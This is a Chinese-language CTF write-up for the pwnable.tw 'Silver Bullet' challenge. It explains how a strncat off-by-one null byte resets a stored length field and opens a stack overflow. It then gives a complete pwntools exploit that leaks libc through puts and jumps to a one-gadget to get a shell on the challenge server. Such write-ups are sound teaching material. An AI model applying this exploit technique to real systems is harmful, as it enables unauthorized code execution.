## 检查

```c
$ file silver_bullet 
silver_bullet: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=8c95d92edf8bf47b6c9c450e882b7142bf656a92, not stripped
$ checksec silver_bullet 
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 分析

运行程序是一个游戏，用ida查看可得，获取胜利与get shell并没有什么关系

所以我们还是需要寻找可利用的漏洞

在power_up函数中

```c
int __cdecl power_up(char *dest)
{
  char s; // [esp+0h] [ebp-34h]
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(&s, 0, 0x30u);
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&s, 48 - *((_DWORD *)dest + 12));  // 新读取字符，要求总长度不大于0x30
  strncat(dest, &s, 48 - *((_DWORD *)dest + 12));// 使用strncat在字符串的结尾追加n个字符
  v3 = strlen(&s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
}
```

strncat并不是单纯的追加n个字符，还会额外添加一个\x00，而我们可以看到。当我们正好写入48个字符时，额外添加的\x00正好是存放字符串长度的地方*((_DWORD *)dest + 12)

所以此时原字符串长度被清零，故此时*((_DWORD *)dest + 12) = 0 + 我们再次添加的长度

于是我们又可以接着往后追加48 - *((_DWORD *)dest + 12)个字符，实现栈溢出

## 利用

所以我们需要做的是首先栈溢出利用puts函数泄漏出libc地址，然后再次调用main函数执行system()实现get shell

需要注意的是：只有beat()成功时才会返回main，否则直接选4 return会以exit(0)方式退出，故而覆盖*dest+12处的数时，需要让他满足win的条件

## exp

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./silver_bullet")
	libc = ELF("./libc-2.23.so")
	io = process("silver_bullet")
else:
	elf = ELF("./silver_bullet")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10103)
	
gadget_addr = 0x3a819
puts_addr = 0x080484a8
read_got = elf.got['read']
main_addr = 0x08048954

def create(s):
	io.recvuntil("choice :")
	io.sendline("1")
	io.recvuntil("bullet :")
	io.sendline(s)
def power(s):
	io.recvuntil("choice :")
	io.sendline("2")
	io.recvuntil("bullet :")
	io.sendline(s)
def beat():
	io.recvuntil("choice :")
	io.sendline("3")

create('a'*47)
power('a')
payload = '\xff'*7+p32(puts_addr)+p32(main_addr)+p32(read_got)
power(payload)
beat()
io.recvuntil("You win !!\n")
read_addr = u32(io.recv(4))
shell_addr=read_addr-libc.symbols["read"] + gadget_addr
create('a'*47)
power('a')
payload2='\xff'*7 + p32(shell_addr)
power(payload2)
beat()

io.interactive()
```



参考：

- [pwnable.tw_Silver Bullet](https://kirin-say.top/2018/06/06/pwnable-tw-Silver-Bullet/)
- [Pwnable.tw刷题之Silverbullet破解过程分享](https://cloud.tencent.com/developer/article/1070137)

